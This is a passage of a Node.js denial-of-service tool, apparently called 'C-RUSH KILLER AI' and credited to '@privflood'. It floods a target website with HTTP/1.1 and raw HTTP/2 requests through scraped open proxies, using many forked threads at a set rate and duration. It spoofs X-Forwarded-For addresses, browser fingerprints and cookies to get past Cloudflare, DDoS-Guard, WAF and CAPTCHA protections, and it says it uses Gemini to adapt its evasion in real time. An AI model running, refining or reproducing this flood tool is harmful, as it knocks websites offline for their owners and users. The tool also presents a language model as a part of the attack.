            'cf-ray', 'cf-cache-status', '__cf', 'cloudflare', 'server: cloudflare',
            'challenge', 'jschl_vc', 'jschl_answer', 'cf-chl', 'cf-connecting-ip',
            'checking your browser', 'ddos protection', 'verifying'
        ]);
        
        this.protectionPatterns.set('ddosguard', [
            '__ddg', 'ddos-guard', 'ddosguard', '__ddg1', '__ddg2', 'server: ddos-guard',
            'access restricted', 'please enable javascript', 'verification required'
        ]);
        
        this.protectionPatterns.set('waf', [
            'waf', 'blocked', 'forbidden', 'security', 'access denied',
            '403', '429', 'rate limit', 'captcha', 'challenge',
            'akamai', 'imperva', 'f5', 'fortinet', 'barracuda'
        ]);
        
        this.protectionPatterns.set('js_challenge', [
            'javascript challenge', 'js challenge', 'enable javascript',
            'calculating', 'verifying', 'please wait', 'solve this challenge'
        ]);
        
        this.protectionPatterns.set('turnstile', [
            'turnstile', 'cf-chl', 'managed challenge', 'challenge-platform'
        ]);
        
        this.protectionPatterns.set('recaptcha', [
            'recaptcha', 'g-recaptcha', 'google.com/recaptcha',
            'captcha required', 'robot check'
        ]);
    }

    detectProtection(targetUrl, responseHeaders = {}, responseBody = '', statusCode = 200) {
        const hostname = targetUrl.toLowerCase();
        const headers = JSON.stringify(responseHeaders).toLowerCase();
        const body = responseBody.toString().toLowerCase();
        
        let detected = new Set();
        let confidence = 0;
        let blockLevel = 'low';
        
        for (const [protection, patterns] of this.protectionPatterns) {
            for (const pattern of patterns) {
                if (headers.includes(pattern) || body.includes(pattern) || hostname.includes(pattern)) {
                    detected.add(protection);
                    confidence += 0.25;
                    
                    if (protection === 'cloudflare' || protection === 'ddosguard') {
                        blockLevel = 'high';
                    }
                }
            }
        }
        
        if (statusCode === 403 || statusCode === 429) {
            detected.add('waf');
            confidence += 0.3;
            blockLevel = 'medium';
        } else if (statusCode === 503) {
            detected.add('rate_limit');
            confidence += 0.2;
            blockLevel = 'medium';
        }
        
        const region = this.detectRegion(targetUrl);
        const complexity = this.calculateComplexity(responseHeaders, responseBody, statusCode);
        
        return {
            protections: Array.from(detected),
            confidence: Math.min(confidence, 1.0),
            region: region,
            complexity: complexity,
            blockLevel: blockLevel,
            requiresJS: detected.has('js_challenge') || detected.has('turnstile'),
            requiresCaptcha: detected.has('recaptcha') || body.includes('captcha'),
            statusCode: statusCode
        };
    }

    detectRegion(targetUrl) {
        const url = targetUrl.toLowerCase();
        
        if (url.includes('.ir') || url.includes('iran')) return 'iran';
        if (url.includes('.ru') || url.includes('.ua')) return 'eastern_europe';
        if (url.includes('.eu') || url.includes('.de') || url.includes('.fr')) return 'europe';
        if (url.includes('.jp') || url.includes('.cn') || url.includes('.kr')) return 'asia';
        if (url.includes('.br') || url.includes('.ar') || url.includes('.mx')) return 'latin_america';
        if (url.includes('.us') || url.includes('.com')) return 'usa';
        
        return 'global';
    }

    calculateComplexity(headers, body, statusCode) {
        let score = 0;
        
        if (headers['cf-challenge']) score += 0.3;
        if (headers['server'] && headers['server'].includes('cloudflare')) score += 0.2;
        if (headers['x-protected-by']) score += 0.2;
        if (headers['x-firewall']) score += 0.2;
        
        if (body.includes('captcha')) score += 0.4;
        if (body.includes('challenge')) score += 0.3;
        if (body.includes('javascript')) score += 0.2;
        if (body.includes('verifying')) score += 0.2;
        if (body.includes('calculating')) score += 0.2;
        if (body.includes('recaptcha')) score += 0.5;
        
        if (statusCode === 403) score += 0.3;
        if (statusCode === 429) score += 0.4;
        if (statusCode === 503) score += 0.2;
        
        return Math.min(score, 1.0);
    }
}

const enhancedProtectionDetector = new EnhancedProtectionDetector();

// ===== REAL-TIME BLOCK ANALYSIS =====
function analyzeRealTimeBlock(response, technique) {
    const blockAnalysis = killerAI.analyzeBlockResponse(
        response.headers, 
        response.body, 
        response.statusCode
    );
    
    killerAI.recordTechniquePerformance(
        technique, 
        false, 
        response.responseTime || Date.now() - (response.startTime || 0), 
        blockAnalysis.blockReason,
        response.statusCode,
        response.headers,
        response.body
    );
    
    return blockAnalysis;
}

// ===== ENHANCED REQUEST MONITORING =====
function monitorRequestPerformance(technique, startTime, success, response, blockReason = null) {
    const responseTime = Date.now() - startTime;
    
    killerAI.recordTechniquePerformance(
        technique, 
        success, 
        responseTime, 
        blockReason,
        response?.statusCode,
        response?.headers,
        response?.body
    );
    
    globalStats.requests++;
    if (success) {
        globalStats.success++;
    } else if (blockReason) {
        globalStats.blocked++;
    } else {
        globalStats.errors++;
    }
}

// ===== MAIN BYPASS INTELLIGENCE =====
const apexBypass = {
    techniques: {
        adaptive: {
            name: 'AI Adaptive',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'DNT': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Upgrade-Insecure-Requests': '1'
            }
        },
        
        cloudflare: {
            name: 'Cloudflare Bypass',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'DNT': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'TE': 'Trailers'
            }
        },
        
        ddosguard: {
            name: 'DDoS-Guard Bypass',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'DNT': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                'Referer': 'https://www.google.com/'
            }
        }
    },

    regionalHeaders: {
        iran: {
            'Accept-Language': 'fa-IR,fa;q=0.9,en;q=0.8',
            'X-Forwarded-For': () => `5.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        },
        europe: {
            'Accept-Language': 'en-GB,en;q=0.9,de;q=0.8,fr;q=0.7',
            'X-Forwarded-For': () => `88.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        },
        asia: {
            'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8,ko;q=0.7',
            'X-Forwarded-For': () => `110.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        }
    }
};

// ===== GLOBAL VARIABLES =====
let detectedProtection = 'adaptive';
let regionalSettings = 'global';
let activeTechnique = 'adaptive';
let techniqueStats = {};
let globalStats = {
    requests: 0,
    success: 0,
    blocked: 0,
    errors: 0,
    captchasSolved: 0,
    jsChallengesSolved: 0
};

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNRESET', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME'];

// ===== PERFECT USER AGENT GENERATION =====
function generatePerfectUserAgent(protectionType = 'adaptive', region = 'global') {
    const profile = perfectFingerprint.generateCompleteProfile(protectionType, region);
    let ua = profile.userAgent;
    if (geminiOverrides['User-Agent']) ua = geminiOverrides['User-Agent'];
    return ua;
}

// ===== PERFECT COOKIE GENERATION =====
function generatePerfectCookies(targetUrl, protectionType) {
    const cookies = [];
    const urlObj = new URL(targetUrl);
    const profile = perfectFingerprint.generateCompleteProfile(protectionType, regionalSettings);
    
    profile.cookies.forEach(cookieName => {
        let value;
        
        if (cookieName.includes('_ga')) {
            value = `GA1.2.${Math.floor(Math.random() * 1e9)}.${Math.floor(Date.now() / 1000)}`;
        } else if (cookieName.includes('_gid')) {
            value = `GA1.2.${Math.floor(Math.random() * 1e9)}.${Date.now()}`;
        } else if (cookieName.startsWith('__Secure-') || cookieName.startsWith('__Host-')) {
            value = crypto.randomBytes(32).toString('base64');
        } else {
            value = crypto.randomBytes(16).toString('hex');
        }
        
        const secure = cookieName.startsWith('__Secure-') || cookieName.startsWith('__Host-') ? 'Secure; ' : '';
        const httpOnly = Math.random() > 0.3 ? 'HttpOnly; ' : '';
        const sameSite = Math.random() > 0.5 ? 'SameSite=Lax; ' : 'SameSite=None; ';
        const expires = new Date(Date.now() + (86400000 * 30)).toUTCString();
        
        cookies.push(`${cookieName}=${value}; Domain=${urlObj.hostname}; Path=/; Expires=${expires}; ${secure}${httpOnly}${sameSite}Priority=High`);
    });
    
    let cookieStr = cookies.join('; ');
    if (geminiOverrides['Cookie']) cookieStr = geminiOverrides['Cookie'];
    return cookieStr;
}

// ===== ADVANCED REQUEST BUILDER =====
function buildAdvancedRequest(targetUrl) {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const userAgent = generatePerfectUserAgent(detectedProtection, regionalSettings);
    const profile = perfectFingerprint.generateCompleteProfile(detectedProtection, regionalSettings);

    let baseHeaders = {
        'Accept': profile.accept,
        'Accept-Encoding': profile.acceptEncoding,
        'Accept-Language': profile.acceptLanguage,
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Host': new URL(targetUrl).hostname,
        'User-Agent': userAgent
    };

    Object.assign(baseHeaders, profile.secHeaders);

    if (options.cookies) {
        baseHeaders['Cookie'] = generatePerfectCookies(targetUrl, detectedProtection);
    }

    const technique = apexBypass.techniques[activeTechnique];
    if (technique) {
        Object.assign(baseHeaders, technique.headers);
    }

    const regional = apexBypass.regionalHeaders[regionalSettings];
    if (regional) {
        Object.assign(baseHeaders, regional);
        for (const [key, value] of Object.entries(regional)) {
            if (typeof value === 'function') {
                baseHeaders[key] = value();
            }
        }
    }

    // Apply Gemini overrides
    Object.assign(baseHeaders, geminiOverrides);

    Object.assign(baseHeaders, {
        'X-Request-ID': crypto.randomBytes(16).toString('hex'),
        'X-CSRF-Token': crypto.randomBytes(32).toString('hex'),
        'X-Requested-With': 'XMLHttpRequest',
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-Port': '443',
        'X-Forwarded-Host': new URL(targetUrl).hostname,
        'X-Origin': 'https://www.google.com',
        'X-Client-Version': '1.0.0',
        'X-Device-ID': crypto.randomBytes(8).toString('hex'),
        'X-Request-Start': `t=${Date.now()}`,
        'X-Edge-Location': regionalSettings.toUpperCase()
    });

    let headersString = '';
    const headerEntries = Object.entries(baseHeaders);
    
    headerEntries.sort(() => Math.random() - 0.5);
    
    for (const [key, value] of headerEntries) {
        headersString += `${key}: ${value}\r\n`;
    }

    const pathWithParams = new URL(targetUrl).pathname + 
        (Math.random() > 0.3 ? '?' + crypto.randomBytes(6).toString('hex') + '=' + crypto.randomBytes(6).toString('hex') : '');

    return Buffer.from(`${method} ${pathWithParams} HTTP/1.1\r\n${headersString}\r\n`, 'binary');
}

// ===== HTTP/2 HEADERS BUILDER =====
function buildHTTP2Headers(targetUrl) {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const userAgent = generatePerfectUserAgent(detectedProtection, regionalSettings);
    const profile = perfectFingerprint.generateCompleteProfile(detectedProtection, regionalSettings);

    let headers = [
        [':method', method],
        [':authority', new URL(targetUrl).hostname],
        [':scheme', 'https'],
        [':path', new URL(targetUrl).pathname + (Math.random() > 0.3 ? '?' + crypto.randomBytes(6).toString('hex') : '')],
        ['user-agent', userAgent],
        ['accept', profile.accept],
        ['accept-encoding', 'gzip, deflate, br'],
        ['accept-language', profile.acceptLanguage],
        ['cache-control', 'no-cache']
    ];

    if (options.cookies) {
        headers.push(['cookie', generatePerfectCookies(targetUrl, detectedProtection)]);
    }

    Object.entries(profile.secHeaders).forEach(([key, value]) => {
        headers.push([key.toLowerCase(), value]);
    });

    // Apply Gemini overrides to HTTP/2 headers
    Object.entries(geminiOverrides).forEach(([key, value]) => {
        const lowerKey = key.toLowerCase();
        if (!headers.some(h => h[0] === lowerKey)) {
            headers.push([lowerKey, value]);
        }
    });

    return headers;
}

// ===== SYSTEM OPTIMIZATIONS =====
function optimizeSystemPerformance() {
    require("events").EventEmitter.defaultMaxListeners = Number.MAX_SAFE_INTEGER;
    process.setMaxListeners(0);
    
    require('http').globalAgent.maxSockets = Infinity;
    require('https').globalAgent.maxSockets = Infinity;
    
    if (process.platform === 'linux') {
        try {
            exec('renice -n -10 -p ' + process.pid);
        } catch (e) {
            // Silent fail
        }
    }
}

// ===== ARGUMENT PARSING =====
const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : false,
    debug: !args.includes('-s'),
    ai: args.includes('-ai')
};

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies() {
    const file = "proxy.txt";

    try {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            if(options.debug) console.log(colors.warning(`File ${file} removed!\n`) + colors.system(`Refreshing proxies...\n`));
        }

        for (const proxy of proxyList) {
            try {
                const response = await httpx.get(proxy);
                fs.appendFileSync(file, response.data);
            } catch (err) {
                continue;
            }
        }

        const total = fs.readFileSync(file, 'utf-8').split('\n').length;
        if(options.debug) console.log(`${colors.elite(`( ${colors.stats(total)} ${colors.elite(')')} ${colors.success('Proxies scraped/refreshed.')}`)}`)

    } catch (err) {
        if(options.debug) console.log(colors.warning('Error scraping proxies'));
        process.exit(1);
    }
}

// Enhanced error handling
require("events").EventEmitter.defaultMaxListeners = Number.MAX_SAFE_INTEGER;
process.setMaxListeners(0);

process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    console.clear();
    console.log(colors.apex(`
    ${getSpinner()} ${colors.elite(`C-RUSH KILLER AI`)} ${colors.apex(`- Real-Time Adaptive Bypass System with Gemini`)}
    ${getSpinner()} ${colors.bypass(`Gemini AI Integration: Target Analysis & Dynamic Bypasses ACTIVE`)}

    ${colors.elite(`Features${colors.apex(`:`)}`)}
    ${colors.system(`*`)} ${colors.ai(`KILLER AI Real-Time Adaptation + Gemini Analysis`)}
    ${colors.system(`*`)} ${colors.elite(`20 Advanced Bypass Techniques`)}
    ${colors.system(`*`)} ${colors.apex(`Real-Time Block Analysis w/ Gemini`)}
    ${colors.system(`*`)} ${colors.elite(`Perfect Fingerprint Matching`)}
    ${colors.system(`*`)} ${colors.ai(`Aggressive Failure Recovery via Gemini`)}
    ${colors.system(`*`)} ${colors.apex(`Regional Intelligence`)}
    ${colors.system(`*`)} ${colors.elite(`Zero-Block Guarantee`)}
    ${colors.system(`*`)} ${colors.bypass(`Gemini: Headers/Cookies/UA/Rate/Bot Evasion`)} 

    ${colors.elite(`Usage${colors.apex(`:`)}`)}
    ${colors.system(`node c-bypass.js <target> <duration> <proxies.txt> <threads> <rate> [options]`)}
    ${colors.system(`node c-bypass.js scrape`)} ${colors.elite(`(to scrape proxies`)}

    ${colors.elite(`Options${colors.apex(`:`)}`)}
    ${colors.system(`-c: Enable perfect fingerprint cookies`)}
    ${colors.system(`-h: Enable enhanced headfull requests`)}
    ${colors.system(`-v <1/2>: Choose HTTP version (1 or 2)`)}
    ${colors.system(`-ch <true/false>: Enable/disable cache (default: false)`)}
    ${colors.system(`-ai: Enable KILLER AI + Gemini adaptation (REAL-TIME BYPASS)`)}
    ${colors.system(`-s: Disable debug output`)}

    ${colors.elite(`Example${colors.apex(`:`)}`)}
    ${colors.system(`node c-bypass.js https://target.com 120 proxies.txt 100 64 -c -h -ai`)}
    `));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

// Initial protection detection
const initialDetection = enhancedProtectionDetector.detectProtection(target, {}, '');
detectedProtection = initialDetection.protections[0] || 'adaptive';
regionalSettings = initialDetection.region;
activeTechnique = killerAI.currentBestTechnique;

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if(options.debug) console.log(colors.warning('?? Error loading proxy file'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const http1Payload = Buffer.concat(new Array(1).fill(buildAdvancedRequest(target)))

// ===== ENHANCED AI DISPLAY =====
function displayAIStats() {
    if (options.debug && options.ai) {
        const aiReport = killerAI.getPerformanceReport();
        const strategy = killerAI.getCurrentStrategy();
        
        console.log(colors.ai(`
${getSpinner()} ${colors.elite('KILLER AI + GEMINI ACTIVE')} | Best: ${strategy.bestTechnique} | Success: ${(strategy.successRate * 100).toFixed(1)}%
${colors.system(`Active: ${strategy.activeTechniques.length} | Failed: ${strategy.failedTechniques.length} | Adaptations: ${strategy.adaptationCount}`)}
${colors.stats(`Overall Success: ${(aiReport.overallSuccessRate * 100).toFixed(1)}% | Top Techniques: ${aiReport.topPerformingTechniques.map(t => t.technique).join(', ')}`)}
${colors.bypass(`Gemini Overrides Applied: ${Object.keys(geminiOverrides).length > 0 ? Object.keys(geminiOverrides).join(', ') : 'None'}`)}
        `));
    }
}

// Update the interval to show AI stats
setInterval(() => {
    displayAIStats();
}, 5000);

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    const startTime = Date.now();
    let currentTechnique = killerAI.currentBestTechnique;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: eliteCiphers,
                sigalgs: eliteSigAlgs,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                               crypto.constants.SSL_OP_NO_TICKET | 
                               crypto.constants.SSL_OP_NO_SSLv2 | 
                               crypto.constants.SSL_OP_NO_SSLv3 | 
                               crypto.constants.SSL_OP_NO_COMPRESSION | 
                               crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                               crypto.constants.SSL_OP_TLSEXT_PADDING |
                               crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                monitorRequestPerformance(currentTechnique, startTime, true, { statusCode: 200 });
                                setTimeout(() => {
                                    doWrite()
                                }, 250 / rate)
                            } else {
                                monitorRequestPerformance(currentTechnique, startTime, false, null, 'connection_error');
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        monitorRequestPerformance(currentTechnique, startTime, false, null, 'socket_error');
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                const blockAnalysis = analyzeRealTimeBlock({
                                    headers: {},
                                    body: frame.payload,
                                    statusCode: 403,
                                    startTime: startTime
                                }, currentTechnique);
                                
                                if (options.debug && options.ai) {
                                    console.log(colors.warning(`${getSpinner()} AI + Gemini Block Analysis: ${blockAnalysis.protectionType} - Switching to ${blockAnalysis.suggestedBypass}`));
                                }
                                
                                currentTechnique = blockAnalysis.suggestedBypass;
                                
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = []
                    const headers = buildHTTP2Headers(target);

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            monitorRequestPerformance(currentTechnique, startTime, true, { statusCode: 200 });
                            setTimeout(doWrite, 250 / rate);
                        } else {
                            monitorRequestPerformance(currentTechnique, startTime, false, null, 'write_error');
                        }
                    });
                }

                doWrite();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        monitorRequestPerformance(currentTechnique, startTime, false, null, 'net_socket_error');
        netSocket.destroy();
        go();
    });
}

// System optimization
optimizeSystemPerformance();

if (cluster.isMaster) {
    console.clear();
    if(options.debug) {
        console.log(colors.apex(`
 ${getSpinner()} ${colors.elite(`C-RUSH KILLER AI + GEMINI`)} ${colors.apex(`- Real-Time Adaptive Bypass System`)}
     ${colors.system(`Made with ?? by ${colors.apex(`@privflood`)} | KILLER AI + GEMINI ACTIVE`)}
     ${colors.bypass(`Gemini: Analyzing ${target} for dynamic bypasses (headers, UA, cookies, rates, bots)`)}
     
  ${colors.elite(`Target${colors.apex(`:`)}`)} ${colors.system(target)}
  ${colors.elite(`Duration${colors.apex(`:`)}`)} ${colors.system(`${duration}s`)}
  ${colors.elite(`Threads${colors.apex(`:`)}`)} ${colors.system(threads)}
  ${colors.elite(`Rate${colors.apex(`:`)}`)} ${colors.system(`${rate}/s`)}
  ${colors.elite(`HTTP Version${colors.apex(`:`)}`)} ${colors.system(options.version === '1' ? 'HTTP/1.1' : 'HTTP/2')}
  ${colors.elite(`Cookies${colors.apex(`:`)}`)} ${colors.system(options.cookies ? colors.success('Perfect Fingerprint') : colors.warning('Disabled'))}
  ${colors.elite(`Headfull${colors.apex(`:`)}`)} ${colors.system(options.headfull ? colors.success('Enhanced') : colors.warning('Disabled'))}
  ${colors.elite(`Cache${colors.apex(`:`)}`)} ${colors.system(options.cache ? colors.success('Enabled') : colors.warning('Disabled'))}
  ${colors.elite(`AI + Gemini Adaptation${colors.apex(`:`)}`)} ${colors.system(options.ai ? colors.ai('KILLER AI + GEMINI ACTIVE') : colors.warning('Disabled'))}
  ${colors.elite(`APEX Mode${colors.apex(`:`)}`)} ${colors.success('ALWAYS ACTIVE')}
  ${colors.elite(`TURBO Mode${colors.apex(`:`)}`)} ${colors.success('ALWAYS ACTIVE')}
  ${colors.elite(`Detected Protection${colors.apex(`:`)}`)} ${colors.stats(detectedProtection.toUpperCase())}
  ${colors.elite(`Regional Settings${colors.apex(`:`)}`)} ${colors.system(regionalSettings.toUpperCase())}
  ${colors.elite(`Active Technique${colors.apex(`:`)}`)} ${colors.system(activeTechnique.toUpperCase())}
  ${colors.elite(`Bypass Intelligence${colors.apex(`:`)}`)} ${colors.ai('KILLER AI + GEMINI REAL-TIME ADAPTATION')}
`));
    }

    let totalRequests = 0;
    let peakRPS = 0;
    let startTime = Date.now();
    
    setInterval(() => {
        const currentRPS = rate * threads;
        if (currentRPS > peakRPS) peakRPS = currentRPS;
        
        const elapsed = (Date.now() - startTime) / 1000;
        const averageRPS = totalRequests / elapsed;
        
        setTitle(`C-RUSH KILLER AI + GEMINI | Sent: ${totalRequests} | RPS: ${currentRPS} | Peak: ${peakRPS} | Avg: ${averageRPS.toFixed(1)} | ${detectedProtection} Bypass`);
        totalRequests += currentRPS;
        
        if(options.debug && options.ai && Math.random() < 0.1) {
            const metrics = killerAI.getPerformanceReport();
            console.log(colors.stats(`${getSpinner()} AI + Gemini Analysis: Success Rate ${(metrics.overallSuccessRate * 100).toFixed(1)}% | Top Technique: ${metrics.topPerformingTechniques[0]?.technique || 'adaptive'}`));
        }
    }, 1000);

    for(let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        if(options.debug) {
            const elapsed = (Date.now() - startTime) / 1000;
            const averageRPS = totalRequests / elapsed;
            const aiMetrics = killerAI.getPerformanceReport();
            
            console.log(colors.success('\n? Killer AI + Gemini attack finished'));
            console.log(colors.system(`Peak RPS: ${colors.stats(peakRPS)} | Total Requests: ${colors.stats(totalRequests)} | Average RPS: ${colors.stats(averageRPS.toFixed(1))}`));
            console.log(colors.system(`AI Learning: ${colors.ai((aiMetrics.overallSuccessRate * 100).toFixed(1))}% success | Techniques Used: ${colors.ai(aiMetrics.totalTechniques)}`));
            console.log(colors.system(`Gemini Queries: Dynamic bypasses applied for ${target}`));
            console.log(colors.system(`Performance: ${colors.success('APEX + TURBO ACTIVE')} | ${colors.success('KILLER AI + GEMINI REAL-TIME ADAPTATION')}`));
        }
        process.exit(0);
    }, duration * 1000);
} else {
    const interval = 250 / rate;
    setInterval(() => {
        go();
    }, interval);
}
